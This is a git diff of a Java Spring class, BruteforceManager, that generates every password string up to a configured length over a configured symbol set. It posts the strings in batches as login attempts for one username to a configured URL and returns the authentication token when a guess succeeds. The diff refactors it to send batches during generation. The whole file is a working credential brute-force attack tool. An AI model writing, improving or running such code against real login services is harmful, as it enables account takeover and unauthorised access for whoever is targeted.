@@ -7,65 +7,54 @@ import org.springframework.core.env.Environment;
 import org.springframework.web.client.HttpStatusCodeException;
 import org.springframework.web.client.RestTemplate;
 
-import java.util.ArrayList;
 import java.util.HashSet;
-import java.util.List;
 
 public class BruteforceManager {
-    private final String bruteforceUrl;
-    private final String bruteforceSymbols;
-    private final String bruteforceMax;
-    private final String bruteforceUser;
-    private final String bruteforceRequestsPer;
+    private final String url;
+    private final String symbols;
+    private final String max;
+    private final String user;
+    private final String dtosPerRequest;
+
+    private HashSet<LoginDto> comb = new HashSet<>();
+    private long totalCount = 0;
 
     @Autowired
     public BruteforceManager(Environment environment) {
-        bruteforceUrl = environment.getProperty("bruteforce.url");
-        bruteforceSymbols = environment.getProperty("bruteforce.symbols");
-        bruteforceMax = environment.getProperty("bruteforce.max");
-        bruteforceUser = environment.getProperty("bruteforce.user");
-        bruteforceRequestsPer = environment.getProperty("bruteforce.requests-per");
+        url = environment.getProperty("bruteforce.url");
+        symbols = environment.getProperty("bruteforce.symbols");
+        max = environment.getProperty("bruteforce.max");
+        user = environment.getProperty("bruteforce.user");
+        dtosPerRequest = environment.getProperty("bruteforce.requests-per");
     }
 
     public String bruteforce() {
-        System.out.println("start gen...");
-        genAll(bruteforceSymbols.toCharArray(), Integer.parseInt(bruteforceMax));
-        System.out.println("generated: " + comb.size());
+        totalCount = 0;
+        comb = new HashSet<>();
 
-        List<LoginDto> dtos = new ArrayList<>();
-        int i = 0;
-        int totalCount = 0;
-        for (String s : comb) {
-            totalCount++;
-            System.out.println(s);
-            if (i > Integer.parseInt(bruteforceRequestsPer)) {
-                String r = sendRequests(dtos);
-                if (r != null) {
-                    return r + "; requests sent: " + totalCount;
-                }
-                i = 0;
-                dtos.clear();
-            } else {
-                dtos.add(new LoginDto(bruteforceUser, s));
-                i++;
-            }
+        String res = genAll(symbols.toCharArray(), Integer.parseInt(max));
+        if (res != null) {
+            return res;
         }
-
-        if (dtos.size() > 0) {
-            System.out.println("total requests: " + comb.size());
-            String r = sendRequests(dtos);
-            if (r != null) {
-                return r + "; requests sent: " + totalCount;
-            }
+        if (comb.size() > 0) {
+            return send();
         }
         return null;
     }
 
-    private String sendRequests(List<LoginDto> loginDtos) {
+    String send() {
+        String r = sendRequests();
+        if (r != null) {
+            return r + "; requests sent: " + totalCount;
+        }
+        comb.clear();
+        return null;
+    }
+
+    private String sendRequests() {
         try {
-            System.out.println("sending request with " + loginDtos.size() + " login data.");
-            LoginResponseDto lgu = new RestTemplate().postForObject(bruteforceUrl, loginDtos, LoginResponseDto.class);
-            System.out.println(lgu);
+            System.out.println("sending request with " + comb.size() + " login data.");
+            LoginResponseDto lgu = new RestTemplate().postForObject(url, comb, LoginResponseDto.class);
             assert lgu != null;
             return lgu.getToken();
         } catch (HttpStatusCodeException ignored) {
@@ -75,31 +64,41 @@ public class BruteforceManager {
         return null;
     }
 
-    static HashSet<String> comb = new HashSet<>();
-
-    static void genAll(char[] set, int k) {
+    String genAll(char[] set, int k) {
         for (int i = 1; i <= k; i++) {
-            gen(set, i);
+            String g = gen(set, i);
+            if (g != null) {
+                return g;
+            }
         }
+        return null;
     }
 
-    static void gen(char[] set, int k) {
+    String gen(char[] set, int k) {
         int n = set.length;
-        printAllKLengthRec(set, "", n, k);
+        return printAllKLengthRec(set, "", n, k);
     }
 
-    static void printAllKLengthRec(char[] set,
-                                   String prefix,
-                                   int n, int k) {
+    String printAllKLengthRec(char[] set,
+                              String prefix,
+                              int n, int k) {
         if (k == 0) {
-            comb.add(prefix);
-            return;
+            comb.add(new LoginDto(this.user, prefix));
+            totalCount++;
+            if (comb.size() >= Integer.parseInt(dtosPerRequest)) {
+                return send();
+            }
+            return null;
         }
 
         for (int i = 0; i < n; ++i) {
             String newPrefix = prefix + set[i];
-            printAllKLengthRec(set, newPrefix,
+            String res = printAllKLengthRec(set, newPrefix,
                     n, k - 1);
+            if (res != null) {
+                return res;
+            }
         }
+        return null;
     }
 }
